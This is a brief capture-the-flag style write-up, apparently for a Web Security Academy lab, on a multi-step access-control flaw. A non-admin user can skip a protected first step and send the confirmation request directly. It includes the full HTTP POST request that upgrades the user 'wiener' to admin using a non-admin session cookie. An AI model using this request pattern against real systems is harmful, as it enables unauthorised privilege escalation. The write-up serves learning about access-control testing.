---
tags:
  - access-control
---
this is very simple, as the guide of the multi step vuln on the academy itself, this is clear.
some times websites forgot to add protection in some steps of some actions.
in this case, for the first step if you try to upgrade user with non admin user cookie, it would give you 403 but in the second step, it would let you to do it.
```text
POST /admin-roles HTTP/2
Host: session-id.web-security-academy.net
Cookie: session=non-admin-user-cookie
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:158.0) Gecko/20100101 Firefox/158.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: https://session-id.web-security-academy.net
Sec-Gpc: 1
Referer: https://session-id.web-security-academy.net/admin-roles
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Priority: u=0, i
Te: trailers

action=upgrade&confirmed=true&username=wiener
```
and done.